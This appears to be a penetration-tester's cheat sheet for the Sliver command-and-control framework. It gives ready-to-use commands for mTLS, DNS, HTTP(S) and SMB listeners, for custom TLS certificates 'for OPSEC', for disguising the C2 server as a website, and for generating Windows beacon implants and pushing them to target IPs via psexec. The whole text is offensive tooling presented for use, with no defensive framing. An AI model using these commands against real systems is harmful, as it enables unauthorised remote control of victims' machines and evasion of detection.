# 03 - Shell Handler

Search Tag: #sliver #command-and-control

## 3.1 - TCP

`sliver > mtls -L <IP> -l <PORT>`

## 3.2 - DNS

`sliver > dns -d <domain>`

## 3.3 - HTTP(S)

### 3.3.1 - Use custom TLS key and certificate (this is optional but recommended for OPSEC)

- Encrypted TLS key and certification

`$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -sha256 -days 365`

- Non-encrypted TLS key and certification

`$ openssl req -new -x509 -keyout key.pem -out certificate.pem -days 365 -nodes`

`sliver > http [-d <domain.com>] -L <IP> -l <PORT>`

`sliver > https [-d <domain.com>] -L <IP> -l <PORT> -c /path/to/cert.pem -k /path/to/key.pem`

### 3.3.2 - Disguise the C2 as a website

`sliver > websites add-content -w -p /index.html -c /home/user/nginx_error.html`

`sliver > http -w error [-d <domain.com>] -L <IP> -l <PORT>`

`sliver > websites rm-content -w error -p /index.html`

## 3.4 - SMB

```
sliver > pivots named-pipe -b <pipe_name>

sliver > profiles new [beacon] [-S <seconds>] [-J <seconds>] -p namedpiped://<compromised_IP>/./pipe/<name_pipe> -l -a x64 -o windows -f service <profile_name>

sliver > psexec -d "<service_description>" -s <service_name> -b C:\path\to\directory -p <profile_name> <target_IP>
```

* You can use a custom exe

```
sliver > generate [beacon] [-S <seconds>] [-J <seconds>] -p namedpiped://<compromised_IP>/./pipe/<name_pipe> -a x64 -o windows -f service -s /path/to/folder

sliver > psexec -d "<service_description>" -s <service_name> -b C:\path\to\directory -c /path/to/shellsvc.exe -p <profile_name> <target_IP>
```